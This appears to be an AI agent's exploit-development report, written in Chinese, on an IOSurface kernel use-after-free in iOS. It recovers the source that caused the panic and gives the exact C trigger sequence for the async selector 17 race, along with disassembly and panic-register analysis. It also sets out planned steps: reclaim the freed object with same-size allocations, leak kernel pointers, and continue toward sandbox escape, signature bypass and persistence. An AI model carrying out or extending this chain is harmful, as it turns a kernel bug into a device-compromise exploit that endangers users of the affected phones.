# 找回那次真 panic 的源码（IOSurface 内核 UAF）

> 用户指出：真正打出 panic 的那份源码被后来的改写覆盖掉了。
> **已从会话记录中逐字恢复。** 恢复件：`harness/israce/main.panic.m`（643 行 / 27,694 字节）
> 来源：会话 `6c22b979-7699-4fd7-ad92-38c473a6eb3c` 的 `write` 工具调用，时间戳 **2026-11-01 12:09:58**

---

## 1. 恢复过程（可复核）

```python
# ~/.dsh/sessions/--...--/6c22b979-.../session.v4.jsonl.zstd
raw = zstandard.ZstdDecompressor().stream_reader(open(f,'rb')).read()
# 筛 type=='tool/call' and data.name=='write'
# and json.loads(data.arguments)['file_path'].endswith('israce/main.m')
# 取 time 最大的一条（12:09:58）的 arguments.content
```

**旁证时间线**（同一会话内的 `tool/call` 时间戳）：

| 时间 | 动作 |
|---|---|
| 12:00:50 | 写 `israce/Payload/UC.app/Info.plist` |
| 12:01:35 | 写 `israce/main.m`（初版） |
| 12:09:25 | 改写 `israce/main.m` |
| **12:09:58** | **改写 `israce/main.m` ← 恢复的这一版** |
| 12:11:12 | 安装 + 启动 |
| **12:11:05** | **第一次 panic** |

---

## 2. 这是真的内核 UAF，不是 DoS

**4/4 次独立启动、4 个不同 slide、4 个不同 CPU，反推回静态地址后完全同点：**

| # | 时间 | slide | pc（静态） | lr（静态） | CPU |
|---|---|---|---|---|---|
| 1 | 12:11:05 | `0x3e48c000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |
| 2 | 12:12:03 | `0x2eb20000` | `0xfffffe000a34ff88` | `0xa346338` | 3 |
| 3 | 12:16:22 | `0x4686c000` | `0xfffffe000a34ff88` | `0xa346338` | 1 |
| 4 | 12:17:54 | `0x2f420000` | `0xfffffe000a34ff88` | `0xa346338` | 0 |

**panic 类型全部是 `Kernel tag check fault`** —— iOS 27 内核启用了内存标记（MTE），
这是它对 UAF 的现场判定，不是普通解引用崩溃。

### 2.1 故障链（逐指令）

```
0xa3462f0  遍历 root+0x188 链表
0xa346324  ldr x0,[x22,#0x58]      ; node->owner = 已被 CFRelease 的 IOSurface
0xa346334  bl  0xa34ff4c           ; lr = 0xa346338  ← 4/4 一致
0xa34ff88  ldr x0,[x0,#0xd8]       ; ★ 取 owner 的锁 → tag 失配
```

**算术验证**：panic 报的寄存器 `x0 = 0xf1fffe327a877480`（去标签 `0xfffffe327a877480`），
`+0xd8 = 0xfffffe327a877558`，而「expected tagged address」= `0xfcfffe327a877558`。
**只有标签不同（0xf1 vs 0xfc），偏移精确等于指令立即数 0xd8。**

⇒ **不是空指针、不是类型混淆——是已释放的 surface 仍被注册表节点持有并解引用。
内存已被重新分配并打上新标签，指针还带着旧标签，MTE 当场抓住。**

---

## 3. 崩溃前跑的确切序列（指纹 `lockdeg-N1-I0100`）

```c
1. mach_port_t wp = newWakePort();                       // 每次迭代新建 wake port
2. IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &c);
3. callSel(c, SEL_REG /*17*/, in, 24, shape, wp);        // ← IOConnectCallAsyncMethod
4. IOSurfaceRef s = IOSurfaceCreate({W:64, H:4, BPE:4, 'BGRA'});
5. 4 个线程循环 IOSurfaceLock(s,0,&seed) / IOSurfaceUnlock(s,0,&seed);
6. sleepUs(200 + (iter % 40) * 25);
7. IOServiceClose(c);                                    // ★ 第 100 次迭代在此炸
8. sleepUs(300); gSpamRun = 0; join;
9. CFRelease(s); dropPort(wp);
```

`out/israce.ndjson` 里 **`begin` 无 `end` 的 key 只有一个**：`lockdeg-N1-I0100`，t=0.178，
前一条 I0099 正常收尾。⇒ 定位精确到单个用例。

### 3.1 selector 17 是 async-only（这是打通的关键）

```
handler 0xa3498f4:  ldr x1,[args+0x10] ; cbz x1 -> kIOReturnBadArgument
```

`args+0x10` 是 **reference 数组指针，只有 `IOConnectCallAsyncMethod` 会填**。
同步调用恒为 0 ⇒ 恒 `BadArgument`。
实测：同步 4 种形态全部 `0xE00002C2`；改 async 后首注册 `SUCCESS`、重复注册 `0xE00002C9`。

**`callSel` 的四种 shape（恢复件 166–187 行）：**

```c
uint64_t ref = 0x1122334455667788ull, zero = 0;
case 0: IOConnectCallMethod(...);                                  // 同步，恒 BadArgument
case 1: IOConnectCallAsyncMethod(c, sel, wp, &ref,  1, ..., &soc, ...);
case 2: IOConnectCallAsyncMethod(c, sel, wp, &zero, 1, ..., &soc, ...);
case 3: IOConnectCallAsyncMethod(c, sel, wp, NULL,  0, ..., &soc, ...);
```

---

## 4. 为什么它会被覆盖：当前版少了什么

`harness/israce/main.m`（当前）与恢复件差异 **993 行**。关键实质差别：

| | 恢复版（打出 panic） | 当前版（被改写） |
|---|---|---|
| wake port | **`newWakePort()` / `dropPort(wp)` 每次迭代建销** | **没有** |
| async 传参 | `callSel(c, SEL_REG, in, 24, shape, wp)` | `callSel(c, SEL_REG, in, 24, gCalibShape, so)` |
| close 后等待 | `sleepUs(300)` | `sleepUs(400)` |
| 变体表 | `V_SURFCH=14, V_LOCKDEG=15, V_BIG=16, V_DEREG18=17` | 被裁剪 |

**丢的是 wake port 与 async shape 这条链** —— 而它是让 selector 17 真的进内核的唯一入口。
没有它，V_LOCKDEG 就退化成「注册失败 + 锁风暴」，打不出 UAF。

---

## 5. 这条线的价值：它可能直接就是 S2

目标链是 S1（用户态执行 ✅）→ **S2（内核内存破坏）** → S3 泄漏 → S4 沙箱逃逸 → S5 签名绕过 → S6 持久化。

**这个 UAF 是 17 轮里唯一被真机反复确证（4/4）、可在无特权 app 内触发、
且 Apple 在 27.2 专门加了 `+0xf1` 粘滞标记去修的候选。**

27.2 的修补形态也印证了它被当真：

- `#802` 锁内置 `mov w8,#1; strb w8,[self,#0xf1]`
- `#799` 锁内测 `ldr w8,[self,#0xf1]; tbz` → 否则 `kIOReturnNotAttached (0xE00002D8)`
- `#802` 从 teardown 末尾**提到最前**
- `+0xf1` 全 cache 访问数：27.0.1 = **0**，27.2 = **2**

⇒ 27.0.1 在「清 `+0xf0`」与「摘链」之间夹了两次函数调用，窗口由此而来。

---

## 6. 下一步（这条比 OOLPROBE 那条强得多）

1. **恢复件直接重跑**：`cp harness/israce/main.panic.m harness/israce/main.m`，
   用当时的 `run.sh` 跑 `V_LOCKDEG`，确认 `lockdeg-N1-I0100` 可复现
2. **拿到可控性**：现在是「必然 UAF 但对象不可控」。要在窗口内用
   `IOSurfaceCreate` 抢占被释放的内存（同 size class），把 owner 指针指到我们布置的内容上
3. **转成泄漏**：UAF 的 owner 被读 `+0xd8` ⇒ 若能让它指向受控内存，读出的就是内核指针

---

## 7. 纪律

- 恢复件是从会话 JSON 逐字取出，**未经我改写**；`main.panic.m` 与当时下发的字节一致
- 恢复件里的中文注释是原作者（子代理）写的，非我补写
- 本文件所有时间戳来自会话 `time` 字段（毫秒 epoch），非推测
- **不得因为这条打过 panic 就当成「已拿到 S2」**：当前状态是
  **「确定性 UAF 已复现，但对象布局不可控」**，离可用原语还有第 6 节 2、3 两步

---

## 8. 版本核查：`newWakePort` 确实在所有后续版本中消失（2026-11-06 15:59 复核）

| 文件 | mtime | 大小 | 与恢复件的差异 | 含 `newWakePort` |
|---|---|---|---|---|
| **`main.panic.m`（恢复件）** | 11-01 **12:09:58**（内容时戳） | 28,352 | — | **是** |
| `main-cur.m` | 11-01 13:26 | 40,542 | 897 行 | 否 |
| `main-repro.m` | 11-01 14:06 | 27,942 | 677 行 | 否 |
| `main.m` | 11-01 14:53 | 46,605 | 991 行 | 否 |

**`grep -l newWakePort main*.m` 只返回 `main.panic.m` 一个文件。**

⇒ 12:09:58 那一版之后，**每一个版本都丢了 wake port 这条链**，
而过 `selector 17` 的 handler（`ldr x1,[args+0x10]; cbz -> BadArgument`）
**只有 async 调用会填那个字段**。

**所以后续所有「V_LOCKDEG 复现不出来」的结论，都是建立在一条已经断掉的链上。**
这也是为什么这条线在被覆盖后被判定为「不可达」——不是它不可达，是代码不再可达。

### 命名说明（按 `out/RULES.md` R1）

- `main.panic.m` 保留原名（描述性，且是唯一证据件），**不再改名，不再覆盖**
- 后续迭代按 `main.v5.m`、`main.v6.m` … 新建
- `main.m` 只作为「当前装到设备上那份」的副本
